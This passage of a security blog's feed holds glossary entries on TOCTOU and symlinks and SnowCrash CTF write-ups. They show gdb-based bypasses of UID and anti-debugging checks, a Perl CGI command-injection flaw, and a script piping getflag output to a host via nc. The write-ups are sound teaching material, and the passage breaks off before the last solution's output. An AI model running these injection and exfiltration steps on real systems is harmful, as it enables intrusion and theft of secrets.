[13:31:08] [Server thread/INFO]: [Server] hello from server
</code></pre></div><p><img src="img/server_cap.png" alt="server cap"></p>
<h2 id="summary">Summary</h2>
<p>We achieve to create a Minecraft server that run on a docker container and automate the download of the server file.
We can also select the version of that server.</p>
<p>The repository is available <a href="https://gitlab.com/firelight.flagboy/docker-minecraft">here</a></p>
<h3 id="what-we-can-improve">What we can improve</h3>
<p>The docker setup is not complete.</p>
<p>We miss some configuration, like:</p>
<ul>
<li>setting the <strong>ops</strong> / <strong>whitelist</strong> / <strong>banlist</strong> file</li>
<li>including a specific map</li>
</ul>
<h2 id="source">Source</h2>
<ul>
<li><a href="https://minecraft.gamepedia.com/Tutorials/Setting_up_a_server">minecraft gamepedia</a></li>
<li><a href="https://minecraft.net">minecraft</a></li>
<li><a href="https://docs.docker.com/engine/reference/builder/">dockerfile reference</a></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>What is TOCTOU</title>
            <link>/posts/glossary/toctou/</link>
            <pubDate>Mon, 17 Aug 2020 14:23:18 +0200</pubDate>
            
            <guid>/posts/glossary/toctou/</guid>
            <description>TOCTOU mean Time-of-Check to Time-of-Use. It&amp;rsquo;s a bug were it involve checking the state of the system and using the result
Example if (access(&amp;#34;file&amp;#34;, W_OK) != 0) { exit(1); } fd = open(&amp;#34;file&amp;#34;, O_WRONLY); write(fd, buffer, sizeof(buffer)); Here an attacker can create a symlink after the access but before the open call, resulting in a malicious file to be open.
Synonyms  TOCTTOU TOC/TOU  Source  wikipedia  </description>
            <content type="html"><![CDATA[<p><strong>TOCTOU</strong> mean Time-of-Check to Time-of-Use. It&rsquo;s a bug were it involve <strong>checking</strong>
the state of the system and <strong>using</strong> the result</p>
<h2 id="example">Example</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">if</span> (access(<span style="color:#e6db74">&#34;file&#34;</span>, W_OK) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
   exit(<span style="color:#ae81ff">1</span>);
}

fd <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;file&#34;</span>, O_WRONLY);
write(fd, buffer, <span style="color:#66d9ef">sizeof</span>(buffer));
</code></pre></div><p>Here an attacker can create a symlink after the <code>access</code> but before the <code>open</code> call,
resulting in a malicious <strong>file</strong> to be open.</p>
<h2 id="synonyms">Synonyms</h2>
<ul>
<li>TOCTTOU</li>
<li>TOC/TOU</li>
</ul>
<h2 id="source">Source</h2>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use">wikipedia</a></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>What is Symlink</title>
            <link>/posts/glossary/symlink/</link>
            <pubDate>Mon, 03 Aug 2020 18:26:16 +0200</pubDate>
            
            <guid>/posts/glossary/symlink/</guid>
            <description>A symbolink link is a file that contains a reference to another file.
That reference take form as a path in its absolute or relative form.
A symlink may contains a path that point to nothing
Synonym  symlink soft link  </description>
            <content type="html"><![CDATA[<p>A <strong>symbolink link</strong> is a file that contains a <em>reference</em> to another file.<br>
That <em>reference</em> take form as a path in its absolute or relative form.</p>
<p>A <strong>symlink</strong> may contains a path that point to nothing</p>
<h2 id="synonym">Synonym</h2>
<ul>
<li>symlink</li>
<li>soft link</li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>Snowcrash - Level14</title>
            <link>/posts/snowcrash/level14/</link>
            <pubDate>Mon, 03 Aug 2020 15:59:10 +0200</pubDate>
            
            <guid>/posts/snowcrash/level14/</guid>
            <description>On connection, we arrived on a empty home dir.
$ ls -l total 0 After searching for a file that is related to flag14 but found nothing.
We try to inspect getflag, the binary that give us the flag for all the previous level
Pseudo Code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75  #include &amp;lt;stdio.</description>
            <content type="html"><![CDATA[<p>On connection, we arrived on a empty home dir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ls -l
total <span style="color:#ae81ff">0</span>
</code></pre></div><p>After searching for a file that is related to <code>flag14</code> but found nothing.<br>
We try to inspect <code>getflag</code>, the binary that give us the flag for all the previous level</p>
<h2 id="pseudo-code">Pseudo Code</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">69
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">70
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">71
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">72
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">73
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">74
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">75
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/ptrace.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">ft_des</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>hash) {
    <span style="color:#75715e">// code ...
</span><span style="color:#75715e"></span>}

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">syscall_open</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">int</span> mode) {
    <span style="color:#75715e">// code ...
</span><span style="color:#75715e"></span>}

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">isLib</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>libname) {
    <span style="color:#75715e">// code ...
</span><span style="color:#75715e"></span>}

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
    <span style="color:#66d9ef">int</span> maps;
    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>lib;
    uid_t uid;
    FILE <span style="color:#f92672">*</span>out;
    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>flag;

    <span style="color:#66d9ef">if</span> (ptrace(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
        puts(<span style="color:#e6db74">&#34;You should not reverse this&#34;</span>);
        exit(<span style="color:#ae81ff">1</span>);
    }
    <span style="color:#66d9ef">if</span> (getenv(<span style="color:#e6db74">&#34;LD_PRELOAD&#34;</span>) <span style="color:#f92672">!=</span> NULL) {
        fwrite(<span style="color:#e6db74">&#34;Injection Linked lib detected exit..</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">25</span>, stderr);
        exit(<span style="color:#ae81ff">1</span>);
    }
    <span style="color:#66d9ef">if</span> (open(<span style="color:#e6db74">&#34;/etc/ld.so.preload&#34;</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>) {
        fwrite(<span style="color:#e6db74">&#34;Injection Linked lib detected exit..</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">25</span>, stderr);
        exit(<span style="color:#ae81ff">1</span>);
    }
    maps <span style="color:#f92672">=</span> syscall_open(<span style="color:#e6db74">&#34;/proc/self/maps&#34;</span>, <span style="color:#ae81ff">0</span>);
    <span style="color:#66d9ef">if</span> (maps <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
        fwrite(<span style="color:#e6db74">&#34;/proc/self/maps is unaccessible, probably a LD_PRELOAD attempt exit..</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">46</span>, stderr);
        exit(<span style="color:#ae81ff">1</span>);
    }

    <span style="color:#66d9ef">if</span> (isLib(<span style="color:#e6db74">&#34;libc&#34;</span>) <span style="color:#f92672">&amp;&amp;</span> isLib(<span style="color:#e6db74">&#34;ld&#34;</span>)) {
        fwrite(<span style="color:#e6db74">&#34;Check flag.Here is your token : &#34;</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">20</span>, stdout);
        uid <span style="color:#f92672">=</span> getuid();
        <span style="color:#66d9ef">switch</span> (uid)
        {
        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">3000</span><span style="color:#f92672">:</span>
            out <span style="color:#f92672">=</span> stdout;
            flag <span style="color:#f92672">=</span> ft_des(<span style="color:#e6db74">&#34;I`fA&gt;_88eEd:=`85h0D8HE&gt;,D&#34;</span>);
            <span style="color:#66d9ef">break</span>;
        <span style="color:#75715e">/*
</span><span style="color:#75715e">        ** Strip other case
</span><span style="color:#75715e">        */</span>
        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">3014</span><span style="color:#f92672">:</span> <span style="color:#75715e">// main+1183
</span><span style="color:#75715e"></span>            out <span style="color:#f92672">=</span> stdout;
            flag <span style="color:#f92672">=</span> ft_des(<span style="color:#75715e">/* 0x08049220 */</span> <span style="color:#e6db74">&#34;g &lt;t61:|4_|!@IF.-62FH&amp;G~DCK/Ekrvvdwz?v|&#34;</span>);
            <span style="color:#66d9ef">break</span>;
        <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
            <span style="color:#66d9ef">if</span> (uid <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
                fwrite(<span style="color:#e6db74">&#34;You are root are you that dumb ?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">21</span>, stdout);
            } <span style="color:#66d9ef">else</span> {
                fputs(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Nope there is no token here for you sorry. Try again :)&#34;</span>, stdout);
            }
            exit (<span style="color:#ae81ff">0</span>);
            <span style="color:#66d9ef">break</span>;
        }
        fputs(flag, out);
    }

    <span style="color:#66d9ef">return</span> (<span style="color:#ae81ff">0</span>);
}
</code></pre></td></tr></table>
</div>
</div><p>We see that <code>getflag</code> is hardened against the use of debugger and the lib injection (line 28-46).<br>
After that we here in a switch-case were the uid is used as index to retreive the correct flag for the user.</p>
<h2 id="the-solution">The Solution</h2>
<p>Beside <code>getflag</code> as setup some protection from using a debugger,
these protection are not strong enough.</p>
<p>See the following execution.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ gdb -q getflag
Reading symbols from /bin/getflag...<span style="color:#f92672">(</span>no debugging symbols found<span style="color:#f92672">)</span>...done.
<span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> b main
Breakpoint <span style="color:#ae81ff">1</span> at 0x804894a
<span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> r
Starting program: /bin/getflag

Breakpoint 1, 0x0804894a in main <span style="color:#f92672">()</span>
<span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> call <span style="color:#f92672">(</span>char*<span style="color:#f92672">)</span>ft_des<span style="color:#f92672">(</span>0x08049220<span style="color:#f92672">)</span>
$1 <span style="color:#f92672">=</span> 0x804c008 <span style="color:#e6db74">&#34;[ ... output omitted ... ]&#34;</span>
</code></pre></div>]]></content>
        </item>
        
        <item>
            <title>Snowcrash - Level13</title>
            <link>/posts/snowcrash/level13/</link>
            <pubDate>Mon, 03 Aug 2020 15:58:10 +0200</pubDate>
            
            <guid>/posts/snowcrash/level13/</guid>
            <description>On our home dir, we have a binary level13.
By executing it, we see that he check if we have the correct UID for using it
$ ./level13 UID 2013 started us but we we expect 4242 $ id uid=2013(level13) gid=2013(level13) groups=2013(level13),100(users) Pseudo Code #define UID 4242  void main(void) { uid_t uid; char *token; uid = getuid(); if (uid != UID) { printf(&amp;#34;UID %d started us but we we expect %d\n&amp;#34;, getuid(), UID); exit(1); } token = ft_des(&amp;#34;boe]!</description>
            <content type="html"><![CDATA[<p>On our home dir, we have a binary <code>level13</code>.<br>
By executing it, we see that he check if we have the correct UID for using it</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ./level13
UID <span style="color:#ae81ff">2013</span> started us but we we expect <span style="color:#ae81ff">4242</span>
$ id
uid<span style="color:#f92672">=</span>2013<span style="color:#f92672">(</span>level13<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>2013<span style="color:#f92672">(</span>level13<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>2013<span style="color:#f92672">(</span>level13<span style="color:#f92672">)</span>,100<span style="color:#f92672">(</span>users<span style="color:#f92672">)</span>
</code></pre></div><h2 id="pseudo-code">Pseudo Code</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#75715e">#define UID 4242
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>)
{
    uid_t uid;
    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>token;

    uid <span style="color:#f92672">=</span> getuid();
    <span style="color:#66d9ef">if</span> (uid <span style="color:#f92672">!=</span> UID) {
        printf(<span style="color:#e6db74">&#34;UID %d started us but we we expect %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, getuid(), UID);
        exit(<span style="color:#ae81ff">1</span>);
    }
    token <span style="color:#f92672">=</span> ft_des(<span style="color:#e6db74">&#34;boe]!ai0FB@.:|L6l@A?&gt;qJ}I&#34;</span>);
    printf(<span style="color:#e6db74">&#34;your token is %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, token);
    <span style="color:#66d9ef">return</span>;
}
</code></pre></div><p>We see that the UID is check before doing anything useful.</p>
<h2 id="the-solution">The solution</h2>
<p>One solution is to use a debugger and call directly the function that generate the flag.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ gdb -q level13
Reading symbols from /home/user/level13/level13...<span style="color:#f92672">(</span>no debugging symbols found<span style="color:#f92672">)</span>...done.
<span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> b main
Breakpoint <span style="color:#ae81ff">1</span> at 0x804858f
<span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> r
Starting program: /home/user/level13/level13

Breakpoint 1, 0x0804858f in main <span style="color:#f92672">()</span>
<span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> call <span style="color:#f92672">(</span>char*<span style="color:#f92672">)</span>ft_des<span style="color:#f92672">(</span>0x80486ef<span style="color:#f92672">)</span>
$2 <span style="color:#f92672">=</span> 0x804b028 <span style="color:#e6db74">&#34;[ ... output omitted ... ]&#34;</span>
</code></pre></div><p>But it exist some other solution, like:</p>
<ul>
<li>Injecting a handcrafted lib to overwrite <code>getuid()</code></li>
<li>rewrite the binary to change the check of UID</li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>Snowcrash - Level12</title>
            <link>/posts/snowcrash/level12/</link>
            <pubDate>Mon, 03 Aug 2020 15:57:10 +0200</pubDate>
            
            <guid>/posts/snowcrash/level12/</guid>
            <description>On our home directory, we have access to a perl script.
The script #!/usr/bin/env perl # localhost:4646 use CGI qw{param}; print &amp;#34;Content-type: text/html\n\n&amp;#34;; sub t { $nn = $_[1]; $xx = $_[0]; $xx =~ tr/a-z/A-Z/; $xx =~ s/\s.*//; @output = `egrep &amp;#34;^$xx&amp;#34; /tmp/xd 2&amp;gt;&amp;amp;1`; foreach $line (@output) { ($f, $s) = split(/:/, $line); if($s =~ $nn) { return 1; } } return 0; } sub n { if($_[0] == 1) { print(&amp;#34;.</description>
            <content type="html"><![CDATA[<p>On our home directory, we have access to a perl script.</p>
<h2 id="the-script">The script</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-perl" data-lang="perl"><span style="color:#75715e">#!/usr/bin/env perl</span>
<span style="color:#75715e"># localhost:4646</span>
<span style="color:#66d9ef">use</span> CGI <span style="color:#e6db74">qw{param}</span>;
<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;Content-type: text/html\n\n&#34;</span>;

<span style="color:#66d9ef">sub</span> <span style="color:#a6e22e">t</span> {
  $nn <span style="color:#f92672">=</span> $_[<span style="color:#ae81ff">1</span>];
  $xx <span style="color:#f92672">=</span> $_[<span style="color:#ae81ff">0</span>];
  $xx <span style="color:#f92672">=~</span> tr<span style="color:#e6db74">/a-z/</span>A<span style="color:#f92672">-</span>Z<span style="color:#f92672">/</span>;
  $xx <span style="color:#f92672">=~</span> <span style="color:#e6db74">s/\s.*//</span>;
  @output <span style="color:#f92672">=</span> <span style="color:#e6db74">`egrep &#34;^$xx&#34; /tmp/xd 2&gt;&amp;1`</span>;
  <span style="color:#66d9ef">foreach</span> $line (@output) {
      ($f, $s) <span style="color:#f92672">=</span> split(<span style="color:#e6db74">/:/</span>, $line);
      <span style="color:#66d9ef">if</span>($s <span style="color:#f92672">=~</span> $nn) {
          <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
      }
  }
  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}

<span style="color:#66d9ef">sub</span> <span style="color:#a6e22e">n</span> {
  <span style="color:#66d9ef">if</span>($_[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
      <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;..&#34;</span>);
  } <span style="color:#66d9ef">else</span> {
      <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;.&#34;</span>);
  }
}

n(t(param(<span style="color:#e6db74">&#34;x&#34;</span>), param(<span style="color:#e6db74">&#34;y&#34;</span>)));
</code></pre></div><p>Here, only the function <code>t()</code> do something interesting.</p>
<h2 id="the-flaw">The Flaw</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-perl" data-lang="perl"><span style="color:#66d9ef">sub</span> <span style="color:#a6e22e">t</span> {
  $nn <span style="color:#f92672">=</span> $_[<span style="color:#ae81ff">1</span>];
  $xx <span style="color:#f92672">=</span> $_[<span style="color:#ae81ff">0</span>];
  $xx <span style="color:#f92672">=~</span> tr<span style="color:#e6db74">/a-z/</span>A<span style="color:#f92672">-</span>Z<span style="color:#f92672">/</span>;
  $xx <span style="color:#f92672">=~</span> <span style="color:#e6db74">s/\s.*//</span>;
  @output <span style="color:#f92672">=</span> <span style="color:#e6db74">`egrep &#34;^$xx&#34; /tmp/xd 2&gt;&amp;1`</span>;
  <span style="color:#66d9ef">foreach</span> $line (@output) {
      ($f, $s) <span style="color:#f92672">=</span> split(<span style="color:#e6db74">/:/</span>, $line);
      <span style="color:#66d9ef">if</span>($s <span style="color:#f92672">=~</span> $nn) {
          <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
      }
  }
  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></td></tr></table>
</div>
</div><p>The flaw is located on the function <code>t()</code> at the <strong>line 6</strong>,
were a shell command is executed using the first parameter of <code>t()</code> alias <code>x</code>.</p>
<p>The argument <code>xx</code> is some what sanitize, all letter become uppercase letter,
everything after the first <em>space</em> char is strip.</p>
<h2 id="the-solution">The Solution</h2>
<p>For the solution, I create a file <code>LVL10</code> (The uppercase name is important)
that when executed send the result of <code>getflag</code> to a server at <code>127.0.0.1:1234</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ cat /tmp/LVL10
<span style="color:#75715e">#!/bin/sh</span>

getflag | nc 127.0.0.1 <span style="color:#ae81ff">1234</span>
$ chmod +x /tmp/LVL10

</code></pre></div><p>When executing the solution, we get the following:</p>
